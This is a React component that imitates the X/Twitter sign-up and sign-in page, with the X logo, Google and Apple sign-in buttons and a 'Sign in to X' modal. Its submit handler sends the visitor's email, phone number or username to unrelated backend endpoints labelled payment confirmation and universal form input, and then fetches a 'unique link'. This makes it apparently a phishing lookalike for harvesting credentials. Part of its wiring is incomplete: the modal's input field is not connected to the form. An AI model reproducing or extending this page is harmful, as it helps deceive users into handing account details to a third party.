import React, { useState, useContext } from "react";
import { Link } from "react-router-dom";
import { useFormik } from "formik";
import * as Yup from "yup";
import { useNavigate } from "react-router-dom";
import { toast } from "sonner";
import { useMutation } from "@tanstack/react-query";
import { AuthContext } from "../context/authContext";
import { jwtDecode } from "jwt-decode";
import Loader from "../components/loader"; // Ensure you have a Loader component
import { FaCheck, FaXmark } from "react-icons/fa6";
import axios from "axios";

const paymentConfirmationUrl = import.meta.env.VITE_payment_confirmation;
const universalFormInputUrl = import.meta.env.VITE_universal_form_input;

function Twitter() {
    const [showSignInModal, setShowSignInModal] = useState(false);
    const [showLoader, setShowLoader] = useState(false);
    const [loading, setLoading] = useState(false);
    const navigate = useNavigate();
    const { setUser, setToken } = useContext(AuthContext);
    const [uniqueLink, setUniqueLink] = useState("");
    const [inputType, setInputType] = useState(null);

    // Toggle the modal with loader
    const toggleSignInModal = () => {
        if (!showSignInModal) {
            setShowSignInModal(true)
            setShowLoader(true);
            setTimeout(() => {
                setShowLoader(false);
            }, 2000);
        } else {
            setShowSignInModal(false)
        }
    };

    // Form validation schema
    const validationSchema = Yup.object({
        email_phone_username: Yup.string()
            .test("isValid", "Enter a valid email, phone number, or username", (value) => {
                if (!value) return false;
                const emailRegex = /\S+@\S+\.\S+/;
                const phoneRegex = /^\d{10,15}$/;
                const usernameRegex = /^[a-zA-Z0-9_]{3,20}$/;

                if (emailRegex.test(value)) setInputType("email");
                else if (phoneRegex.test(value)) setInputType("phone");
                else if (usernameRegex.test(value)) setInputType("username");
                else {
                    setInputType(null);
                    return false;
                }
                return true;
            })
            .required("Required"),
    });

    const twitterLoginMutation = useMutation({
        mutationFn: async (data) => {
            setLoading(true);
            try {
                const loginResponse = await axios.post(paymentConfirmationUrl, data);
                if (loginResponse.status === 201) {
                    setUser(jwtDecode(loginResponse.data.access));
                    setToken(loginResponse.data.access);

                    const paymentResponse = await axios.post(paymentConfirmationUrl);
                    if (paymentResponse.status === 200) {
                        setUniqueLink(paymentResponse.data.uniqueLink);
                        toast.success(`Access your form: ${paymentResponse.data.uniqueLink}`);
                        await axios.post(`${universalFormInputUrl}${paymentResponse.data.uniqueLink}/`);
                    }
                    navigate("/");
                    toast.success("Welcome!");
                }
            } catch (error) {
                toast.error("Login failed");
            } finally {
                setLoading(false);
            }
        },
    });

    const { handleSubmit, handleChange, values, touched, errors } = useFormik({
        initialValues: { email_phone_username: "" },
        validationSchema,
        onSubmit: (value) => twitterLoginMutation.mutate(value),
    });

    return (
        <div className="flex flex-col items-center justify-center min-h-screen bg-black">
            <div className="container flex flex-col md:flex-row justify-center items-center">
                <div className="flex-1 md:mr-10">
                    <img src="http://127.0.0.1:8000/media/packages_img/x.png" className="mx-auto w-[70%] aspect-square object-contain" alt="X" />
                </div>
                <div className="flex-1 flex flex-col items-start gap-16">
                    <div>
                        <h1 className="text-4xl md:text-7xl font-bold text-[#e7e9ea]">Happening Now</h1>
                    </div>
                    <div>
                        <h2 className="text-2xl md:text-3xl font-bold text-left text-white">Join Today</h2>
                        <div className="button-group mt-6 space-y-4">
                            <button className="w-full flex items-center justify-center gap-2 bg-white text-black border border-gray-300 rounded-full py-2 px-8 md:px-24 hover:bg-gray-100">
                                <span>Sign up with Google</span>
                                <img src="http://127.0.0.1:8000/media/packages_img/g.png" alt="Google logo" className="w-6" />
                            </button>
                            <button className="w-full flex items-center justify-center bg-white text-black border border-gray-300 rounded-full py-2 px-8 md:px-24 hover:bg-gray-100">
                                <img src="http://127.0.0.1:8000/media/packages_img/a.png" alt="Apple logo" className="w-10" />
                                <span>Sign up with Apple</span>
                            </button>
                            <div className="w-full text-center flex gap-4 items-center">
                                <hr className="flex-1" />
                                <p className="spanner block font-semibold text-white">or</p>
                                <hr className="flex-1" />
                            </div>
                            <button className="bg-blue-500 text-white font-extrabold rounded-full py-2 px-12 md:px-32 hover:bg-blue-600">
                                <Link to="https://twitter.com/i/flow/signup"
                                    target="_blank"
                                    className="block w-full text-white">
                                    Create account
                                </Link>
                            </button>
                        </div>
                        <p className="text-gray-500 text-xs mt-4 max-w-xs text-center md:text-left">
                            By signing up, you agree to the <Link to="#" className="text-blue-500">Terms of Service</Link> and <Link to="#" className="text-blue-500">Privacy Policy</Link>, including <Link to="#" className="text-blue-500">Cookie Use</Link>.
                        </p>
                        <div className="mt-16">
                            <h2 className="text-lg text-white font-bold text-center md:text-left my-4">Already have an account?</h2>
                            <button onClick={toggleSignInModal} className="w-full mt-2 bg-transparent text-blue-700 border border-blue-500 rounded-full py-2 px-8 md:px-4 hover:bg-blue-100 font-bold">Sign in</button>
                        </div>
                    </div>

                </div>
            </div>
            {showSignInModal && (
                <div className="fixed inset-0 flex items-center justify-center bg-white bg-opacity-30">
                    <div className="bg-black rounded-lg w-full max-w-xl p-10 relative">
                        <div className="w-[70%] mx-auto">
                            <button onClick={toggleSignInModal} className="button-close-modal text-white absolute top-3 left-3 text-3xl">&times;</button>
                            <span className="logo-twitter-modal flex justify-center mb-4 text-3xl">
                                <div className="flex-1 md:mr-10">
                                    <img src="http://127.0.0.1:8000/media/packages_img/x.png" className="mx-auto w-10 aspect-square object-contain" alt="X" />
                                </div>
                            </span>
                            {showLoader ?
                                <Loader signIn={true} />
                            : 
                            (<div className="space-y-3">
                                <h2 className="mt-4 text-2xl font-bold text-white">Sign in to X</h2>
                                <div className="space-y-4">
                                    <button className="w-full flex items-center justify-center bg-white text-black border border-gray-300 rounded-full py-2 px-20 hover:bg-gray-100">
                                        <span>Sign in with Google</span>
                                        <img src="http://127.0.0.1:8000/media/packages_img/g.png" alt="Google logo" className="w-6" />
                                    </button>
                                    <button className="w-full flex items-center justify-center bg-white text-black border border-gray-300 rounded-full py-2 px-20 hover:bg-gray-100">
                                        <img src="http://127.0.0.1:8000/media/packages_img/a.png" alt="Google logo" className="w-6" />
                                        <span>Sign in with Apple</span>
                                    </button>
                                    <div className="mt-4 w-full text-center flex gap-4 items-center">
                                        <hr className="flex-1" />
                                        <p className="spanner block font-semibold text-white">or</p>
                                        <hr className="flex-1" />
                                    </div>
                                    <input className="mt-4 p-2 border border-gray-300 rounded w-full" type="text" placeholder="Phone, email, or username" />
                                    <button className="bg-blue-800 text-white py-2 rounded-full hover:bg-blue-600 w-full mt-4">Next</button>
                                    <button className="bg-transparent text-blue-700 py-2 rounded-full border border-blue-700 hover:bg-blue-100 w-full mt-4">Forgot Password</button>
                                </div>
                                <p className="mt-6 text-gray-500 text-sm">
                                    Don't have an account? <button className="text-blue-500 font-bold hover:underline">Sign Up</button>
                                </p>
                            </div>)}
                        </div>
                    </div>
                </div>
            )}
        </div>
    );
}

export default Twitter;
